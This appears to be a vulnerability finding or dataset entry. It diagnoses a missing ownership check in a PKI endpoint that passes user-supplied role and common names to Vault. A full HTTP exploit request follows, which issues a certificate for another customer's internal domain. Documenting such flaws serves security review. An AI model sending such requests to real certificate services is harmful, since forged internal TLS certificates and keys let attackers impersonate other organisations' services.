diagnosis: The PKI certificate issuance endpoint delegates to Vault PKI generate_certificate using user-supplied role_name and common_name. It verifies user authentication but does not check if user.organization_id owns common_name. An attacker can generate valid internal TLS certificates and private keys for domains belonging to another enterprise customer.
exploit_request:
POST /pki/issue-certificate HTTP/1.1
Host: pki.ca-service.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"role_name": "internal-service-role", "common_name": "api.competitor-bank.internal"}
